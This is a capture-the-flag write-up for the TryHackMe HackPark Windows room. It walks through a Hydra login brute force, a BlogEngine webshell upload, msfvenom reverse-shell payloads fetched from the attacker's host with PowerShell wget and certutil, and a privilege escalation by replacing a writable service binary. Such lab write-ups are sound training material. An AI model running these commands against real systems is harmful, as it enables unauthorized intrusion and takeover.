# HackPark - TryHackMe Writeup

**OS:** Windows  
**Difficulty:** Medium  
**Topics:** Hydra HTTP POST brute force, BlogEngine RCE, Meterpreter, Windows service misconfiguration

---

## Enumeration

```bash
nmap -sS -T4 -Pn <TARGET_IP>
```

Key findings:
- `80/tcp` open
- Web login form available (`/Account/login.aspx`)
- Login method: `POST`

---

## Foothold

### 1. Brute force admin login (Hydra)

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  <TARGET_IP> http-post-form \
  "/Account/login.aspx:<POST_BODY_WITH_^PASS^>:Login failed"
```

After successful login, check BlogEngine version in admin panel (`About`).

### 2. Exploit BlogEngine upload/RCE path

Prepare a webshell payload file (commonly `PostView.ascx` in public PoCs), then:

```bash
nc -lvnp 4445
```

Upload payload via admin editor/file manager, then trigger:

```text
http://<TARGET_IP>/?theme=../../App_Data/files
```

---

## Shell Upgrade

Use meterpreter for easier privesc workflow.

Start handler:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
run
```

Generate payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o reverse.exe
```

Host and download from target:

```bash
python3 -m http.server 80
```

```powershell
powershell -c "wget http://<YOUR_IP>/reverse.exe -outfile reverse.exe"
.\reverse.exe
```

---

## Privilege Escalation

From meterpreter, enumerate:

```text
sysinfo
```

PowerUp workflow:

```text
upload /path/to/PowerUp.ps1
load powershell
powershell_shell
. .\PowerUp.ps1
Invoke-AllChecks
```

Inspect scheduler artifacts:

```powershell
cd "C:\Program Files (x86)\SystemScheduler\Events"
type .\20198415519.INI_LOG.txt
```

Abuse writable service binary by replacing `Message.exe`.

Generate replacement payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4446 -f exe-service -o Message.exe
```

Upload replacement:

```text
upload Message.exe "C:\Program Files (x86)\SystemScheduler\Message.exe"
```

Set new handler port and wait for privileged callback:

```text
set LPORT 4446
run
```

---

## Alternative (Without Metasploit Handler)

Generate stageless binary:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4443 -f exe-service -o Message.exe
```

Serve and listen:

```bash
python3 -m http.server 80
nc -lvnp 4443
```

Download on target:

```powershell
certutil -urlcache -f http://<YOUR_IP>/Message.exe Message.exe
```

---

## Key Takeaways

- ASP.NET login forms are often brute-forceable with `hydra http-post-form` when you capture exact POST fields
- BlogEngine version disclosure in admin panels can quickly lead to known RCE chains
- Writable service executables (`exe-service` replacement) are reliable Windows privilege escalation paths
